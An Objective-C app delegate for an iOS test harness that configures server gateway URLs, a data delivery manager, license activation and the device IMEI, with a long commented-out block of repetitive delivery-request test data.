//
//  TestAppAppDelegate.m
//  TestApp
//
//  Created by Makara Khloth on 8/19/11.
//  Copyright __MyCompanyName__ 2011. All rights reserved.
//

#import "TestAppAppDelegate.h"
#import "TestAppViewController.h"
#import "TestSessionNotFoundViewController.h"
#import "SentinelViewController.h"

#import "LightEDM.h"
#import "LightActivationManager.h"
#import "LicenseManager+Dummy.h"
#import "AppContextImpl+Dummy.h"
#import "PhoneInfoImpl+Dummy.h"

#import "RequestPersistStore.h"
#import "DeliveryRequest.h"
#import "RequestStore.h"

#import "CommandServiceManager.h"
#import "DataDeliveryManager.h"
#import "DaemonPrivateHome.h"

#import "TestManager.h"

@interface TestAppAppDelegate (private)
- (void) testDDMRequests;
@end

@implementation TestAppAppDelegate

@synthesize window;
@synthesize viewController, mTestSessionNotFoundViewController, mSentinelViewController;

@synthesize mRequestPersistStore;
@synthesize mRequestStore;
@synthesize mCSM;
@synthesize mDDM;
@synthesize mEDM;
@synthesize mActivationManager;
@synthesize mLicenseManager;
@synthesize mAppContextImpl;

@synthesize mTestManager;

- (void)applicationDidFinishLaunching:(UIApplication *)application {    
    
    // Override point for customization after app launch    
    //[window addSubview:viewController.view];
    //[window addSubview:mTestSessionNotFoundViewController.view];
    [window addSubview:mSentinelViewController.view];
    [window makeKeyAndVisible];
    
    //[self testDDMRequests];
	
	NSString* csmDoc = [DaemonPrivateHome daemonPrivateHome];
	mCSM = [CommandServiceManager sharedManagerWithPayloadPath:csmDoc withDBPath:csmDoc];
    
    NSString *resourcePath = [[NSBundle mainBundle] resourcePath];
    NSString *serverUrlFilePath = [resourcePath stringByAppendingString:@"/server.plist"];
    NSDictionary *serverInfo = [NSDictionary dictionaryWithContentsOfFile:serverUrlFilePath];
    if (serverInfo) {
        NSString *serverUrl = [serverInfo objectForKey:@"server"];
        NSString *structuredUrl = [serverUrl stringByAppendingString:@"/gateway"];
        NSString *unstructuredUrl = [serverUrl stringByAppendingString:@"/gateway/unstructured"];
        [mCSM setStructuredURL:[NSURL URLWithString:structuredUrl]];
        [mCSM setUnstructuredURL:[NSURL URLWithString:unstructuredUrl]];
    } else {
        [mCSM setStructuredURL:[NSURL URLWithString:@"http://test-csmobile.mobilefonex.com/gateway"]];
        [mCSM setUnstructuredURL:[NSURL URLWithString:@"http://test-csmobile.mobilefonex.com/gateway/unstructured"]];
    }
    
	mDDM = [[DataDeliveryManager alloc] initWithCSM:mCSM];
    
    mLicenseManager = [[LicenseManager alloc] init];
    [mDDM setMLicenseManager:mLicenseManager];
    
    mAppContextImpl = [[AppContextImpl alloc] init];
    [mDDM setMAppContext:mAppContextImpl];
    [mCSM setIMEI:[[mAppContextImpl getPhoneInfo] getIMEI]];
	
	mEDM = [[LightEDM alloc] initWithDataDelivery:mDDM];
	mActivationManager = [[LightActivationManager alloc] initWithDataDelivery:mDDM];
    
    NSString *licFilePath = [DaemonPrivateHome daemonPrivateHome];
    licFilePath = [licFilePath stringByAppendingString:@"lic.plist"];
    NSFileManager *fileManager = [NSFileManager defaultManager];
    if ([fileManager fileExistsAtPath:licFilePath]) {
        NSDictionary *licInfo = [NSDictionary dictionaryWithContentsOfFile:licFilePath];
        NSString *activationCode = [licInfo objectForKey:@"key"];
        NSNumber *configID = [licInfo objectForKey:@"configID"];
        [mLicenseManager setMActivationCode:activationCode];
        [mLicenseManager setMConfigID:[configID integerValue]];
        
        [[mTestSessionNotFoundViewController mActivationCode] setText:activationCode];
    }
    
    mTestManager = [[TestManager alloc] init];
    [mTestManager setMActivationManager:mActivationManager];
    [mTestManager setMEDM:mEDM];
}

- (void) testDDMRequests {
    //mRequestPersistStore = [[RequestPersistStore alloc] init];
	//[mRequestPersistStore dropAllRequests];
	
	//mRequestStore = [[RequestStore alloc] init];
    
	/*
	NSInteger csid = 0;
	// 0
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCSID:csid++];
    [request setMCallerId:273242];
    [request setMPriority:kDDMRequestPriortyHigh];
    [request setMRetryCount:0];
    [request setMMaxRetry:45];
    [request setMPersisted:TRUE];
    [request setMEDPType:kEDPTypeCommon];
    [request setMRetryTimeout:4395];
    [request setMConnectionTimeout:345];
	[request setMCommandCode:4];
	[mRequestStore addRequest:request];
	[request release];
	// 1
	request = [[DeliveryRequest alloc] init];
    [request setMCSID:csid++];
    [request setMCallerId:273242];
    [request setMPriority:kDDMRequestPriortyLow];
    [request setMRetryCount:0];
    [request setMMaxRetry:45];
    [request setMPersisted:TRUE];
    [request setMEDPType:kEDPTypeCommon];
    [request setMRetryTimeout:4395];
    [request setMConnectionTimeout:345];
	[request setMCommandCode:4];
	[mRequestStore addRequest:request];
	[request release];
	// 2
	request = [[DeliveryRequest alloc] init];
    [request setMCSID:csid++];
    [request setMCallerId:273242];
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMRetryCount:0];
    [request setMMaxRetry:45];
    [request setMPersisted:TRUE];
    [request setMEDPType:kEDPTypeCommon];
    [request setMRetryTimeout:4395];
    [request setMConnectionTimeout:345];
	[request setMCommandCode:4];
	[mRequestStore addRequest:request];
	[request release];
	// 3
	request = [[DeliveryRequest alloc] init];
    [request setMCSID:csid++];
    [request setMCallerId:273242];
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMRetryCount:0];
    [request setMMaxRetry:45];
    [request setMPersisted:TRUE];
    [request setMEDPType:kEDPTypeCommon];
    [request setMRetryTimeout:4395];
    [request setMConnectionTimeout:345];
	[request setMCommandCode:4];
	[mRequestStore addRequest:request];
	[request release];
	// 4
	request = [[DeliveryRequest alloc] init];
    [request setMCSID:csid++];
    [request setMCallerId:273242];
    [request setMPriority:kDDMRequestPriortyLow];
    [request setMRetryCount:0];
    [request setMMaxRetry:45];
    [request setMPersisted:TRUE];
    [request setMEDPType:kEDPTypeCommon];
    [request setMRetryTimeout:4395];
    [request setMConnectionTimeout:345];
	[request setMCommandCode:4];
	[mRequestStore addRequest:request];
	[request release];
	// 5
	request = [[DeliveryRequest alloc] init];
    [request setMCSID:csid++];
    [request setMCallerId:273242];
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMRetryCount:0];
    [request setMMaxRetry:45];
    [request setMPersisted:TRUE];
    [request setMEDPType:kEDPTypeCommon];
    [request setMRetryTimeout:4395];
    [request setMConnectionTimeout:345];
	[request setMCommandCode:4];
	[mRequestStore addRequest:request];
	[request release];
	
	// 6
	request = [[DeliveryRequest alloc] init];
    [request setMCSID:csid++];
    [request setMCallerId:273242];
    [request setMPriority:kDDMRequestPriortyLow];
    [request setMRetryCount:0];
    [request setMMaxRetry:45];
    [request setMPersisted:TRUE];
    [request setMEDPType:kEDPTypeCommon];
    [request setMRetryTimeout:4395];
    [request setMConnectionTimeout:345];
	[request setMCommandCode:4];
	[mRequestStore addRequest:request];
	[request release];
	// 7
	request = [[DeliveryRequest alloc] init];
    [request setMCSID:csid++];
    [request setMCallerId:273242];
    [request setMPriority:kDDMRequestPriortyHigh];
    [request setMRetryCount:0];
    [request setMMaxRetry:45];
    [request setMPersisted:TRUE];
    [request setMEDPType:kEDPTypeCommon];
    [request setMRetryTimeout:4395];
    [request setMConnectionTimeout:345];
	[request setMCommandCode:4];
	[mRequestStore addRequest:request];
	[request release];
	
	// 8
	request = [[DeliveryRequest alloc] init];
    [request setMCSID:csid++];
    [request setMCallerId:273242];
    [request setMPriority:kDDMRequestPriortyHigh];
    [request setMRetryCount:0];
    [request setMMaxRetry:45];
    [request setMPersisted:TRUE];
    [request setMEDPType:kEDPTypeCommon];
    [request setMRetryTimeout:4395];
    [request setMConnectionTimeout:345];
	[request setMCommandCode:4];
	[mRequestStore addRequest:request];
	[request release];
	// 9
	request = [[DeliveryRequest alloc] init];
    [request setMCSID:csid++];
    [request setMCallerId:273242];
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMRetryCount:0];
    [request setMMaxRetry:45];
    [request setMPersisted:TRUE];
    [request setMEDPType:kEDPTypeCommon];
    [request setMRetryTimeout:4395];
    [request setMConnectionTimeout:345];
	[request setMCommandCode:4];
	[mRequestStore addRequest:request];
	[request release];
	// 10
	request = [[DeliveryRequest alloc] init];
    [request setMCSID:csid++];
    [request setMCallerId:273242];
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMRetryCount:0];
    [request setMMaxRetry:45];
    [request setMPersisted:TRUE];
    [request setMEDPType:kEDPTypeCommon];
    [request setMRetryTimeout:4395];
    [request setMConnectionTimeout:345];
	[request setMCommandCode:4];
	[mRequestStore addRequest:request];
	[request release];
	// 11
	request = [[DeliveryRequest alloc] init];
    [request setMCSID:csid++];
    [request setMCallerId:273242];
    [request setMPriority:kDDMRequestPriortyLow];
    [request setMRetryCount:0];
    [request setMMaxRetry:45];
    [request setMPersisted:TRUE];
    [request setMEDPType:kEDPTypeCommon];
    [request setMRetryTimeout:4395];
    [request setMConnectionTimeout:345];
	[request setMCommandCode:4];
	[mRequestStore addRequest:request];
	[request release];
	// 12
	request = [[DeliveryRequest alloc] init];
    [request setMCSID:csid++];
    [request setMCallerId:273242];
    [request setMPriority:kDDMRequestPriortyLow];
    [request setMRetryCount:0];
    [request setMMaxRetry:45];
    [request setMPersisted:TRUE];
    [request setMEDPType:kEDPTypeCommon];
    [request setMRetryTimeout:4395];
    [request setMConnectionTimeout:345];
	[request setMCommandCode:4];
	[mRequestStore addRequest:request];
	[request release];
	// 13
	request = [[DeliveryRequest alloc] init];
    [request setMCSID:csid++];
    [request setMCallerId:273242];
    [request setMPriority:kDDMRequestPriortyLow];
    [request setMRetryCount:0];
    [request setMMaxRetry:45];
    [request setMPersisted:TRUE];
    [request setMEDPType:kEDPTypeCommon];
    [request setMRetryTimeout:4395];
    [request setMConnectionTimeout:345];
	[request setMCommandCode:4];
	[mRequestStore addRequest:request];
	[request release];
	// 14
	request = [[DeliveryRequest alloc] init];
    [request setMCSID:csid++];
    [request setMCallerId:273242];
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMRetryCount:0];
    [request setMMaxRetry:45];
    [request setMPersisted:TRUE];
    [request setMEDPType:kEDPTypeCommon];
    [request setMRetryTimeout:4395];
    [request setMConnectionTimeout:345];
	[request setMCommandCode:4];
	[mRequestStore addRequest:request];
	[request release];
	// 15
	request = [[DeliveryRequest alloc] init];
    [request setMCSID:csid++];
    [request setMCallerId:273242];
    [request setMPriority:kDDMRequestPriortyHigh];
    [request setMRetryCount:0];
    [request setMMaxRetry:45];
    [request setMPersisted:TRUE];
    [request setMEDPType:kEDPTypeCommon];
    [request setMRetryTimeout:4395];
    [request setMConnectionTimeout:345];
	[request setMCommandCode:4];
	[mRequestStore addRequest:request];
	[request release];
	// 16
	request = [[DeliveryRequest alloc] init];
    [request setMCSID:csid++];
    [request setMCallerId:273242];
    [request setMPriority:kDDMRequestPriortyLow];
    [request setMRetryCount:0];
    [request setMMaxRetry:45];
    [request setMPersisted:TRUE];
    [request setMEDPType:kEDPTypeCommon];
    [request setMRetryTimeout:4395];
    [request setMConnectionTimeout:345];
	[request setMCommandCode:4];
	[mRequestStore addRequest:request];
	[request release];
	// 17
	request = [[DeliveryRequest alloc] init];
    [request setMCSID:csid++];
    [request setMCallerId:273242];
    [request setMPriority:kDDMRequestPriortyLow];
    [request setMRetryCount:0];
    [request setMMaxRetry:45];
    [request setMPersisted:TRUE];
    [request setMEDPType:kEDPTypeCommon];
    [request setMRetryTimeout:4395];
    [request setMConnectionTimeout:345];
	[request setMCommandCode:4];
	[mRequestStore addRequest:request];
	[request release];
	// 18
	request = [[DeliveryRequest alloc] init];
    [request setMCSID:csid++];
    [request setMCallerId:273242];
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMRetryCount:0];
    [request setMMaxRetry:45];
    [request setMPersisted:TRUE];
    [request setMEDPType:kEDPTypeCommon];
    [request setMRetryTimeout:4395];
    [request setMConnectionTimeout:345];
	[request setMCommandCode:4];
	[mRequestStore addRequest:request];
	[request release];
	// 19
	request = [[DeliveryRequest alloc] init];
    [request setMCSID:csid++];
    [request setMCallerId:273242];
    [request setMPriority:kDDMRequestPriortyLow];
    [request setMRetryCount:0];
    [request setMMaxRetry:45];
    [request setMPersisted:TRUE];
    [request setMEDPType:kEDPTypeCommon];
    [request setMRetryTimeout:4395];
    [request setMConnectionTimeout:345];
	[request setMCommandCode:4];
	[mRequestStore addRequest:request];
	[request release];
	 */
}

- (void)dealloc {
    [mTestManager release];
    
	[mDDM release];
	[mCSM release];
    [mRequestStore release];
	[mRequestPersistStore release];
    [mLicenseManager release];
    [mAppContextImpl release];
    
    [mSentinelViewController release];
    [viewController release];
    [mTestSessionNotFoundViewController release];
    [window release];
    
    [super dealloc];
}


@end
